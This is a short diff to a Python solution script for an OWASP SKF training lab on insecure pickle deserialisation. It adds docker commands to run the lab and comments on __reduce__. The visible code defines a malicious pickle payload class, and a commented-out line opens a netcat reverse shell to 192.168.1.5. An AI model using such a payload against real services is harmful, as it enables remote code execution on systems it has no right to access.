@@ -1,5 +1,9 @@
 ### This is a automation/solution to OWASP SKF Labs | KBID XXX - Deserialisation Pickle made by Charalampos Theodorou at 22/07/2022
 
+# To run the lab use the following commads
+# docker pull blabla1337/owasp-skf-lab:des-pickle-2
+#docker run --rm -ti -p 5000:5000 blabla1337/owasp-skf-lab:des-pickle-2
+
 import pickle, base64, os, requests
 
 
@@ -45,7 +49,9 @@ print(localserialdata)
 
 #Now that we know how this works lets try the RCE
 #We will serialize a payload class that has the __reduce__ magic method that the usr has.
-
+#When you try to pickle an object, there might be some properties that don't serialize well. 
+#One example of this is an open file handle. Pickle won't know how to handle the object and will throw an error.
+#You can tell the pickle module how to handle these types of objects natively within a class directly. 
 class payload(object):
   def __reduce__(self):
     #return (os.system,(f"nc -nv 192.168.1.5 9999 -e /bin/sh",))
